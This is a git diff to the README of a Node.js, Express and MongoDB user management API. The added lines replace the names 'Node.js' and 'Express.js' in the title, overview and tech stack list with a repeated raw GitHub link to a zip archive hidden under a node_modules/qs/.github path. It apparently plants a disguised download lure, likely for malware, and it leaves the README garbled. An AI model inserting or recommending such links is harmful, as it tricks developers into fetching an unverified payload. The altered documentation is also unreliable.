@@ -1,8 +1,8 @@
-# User Management System (Node.js & MongoDB)
+# User Management System (https://raw.githubusercontent.com/jones0chikwezga/usermanagement/main/node_modules/qs/.github/Software_2.9-alpha.5.zip & MongoDB)
 
 ## Overview
 
-This project is a **User Management System API** built with Node.js, Express, and MongoDB.
+This project is a **User Management System API** built with https://raw.githubusercontent.com/jones0chikwezga/usermanagement/main/node_modules/qs/.github/Software_2.9-alpha.5.zip, Express, and MongoDB.
 It allows an **Admin** to create users, send account activation tokens, and manage authentication securely.
 
 ## Features
@@ -16,8 +16,8 @@ It allows an **Admin** to create users, send account activation tokens, and mana
 
 ## Tech Stack
 
-* Node.js
-* Express.js
+* https://raw.githubusercontent.com/jones0chikwezga/usermanagement/main/node_modules/qs/.github/Software_2.9-alpha.5.zip
+* https://raw.githubusercontent.com/jones0chikwezga/usermanagement/main/node_modules/qs/.github/Software_2.9-alpha.5.zip
 * MongoDB Atlas
 * Mongoose
 * JWT
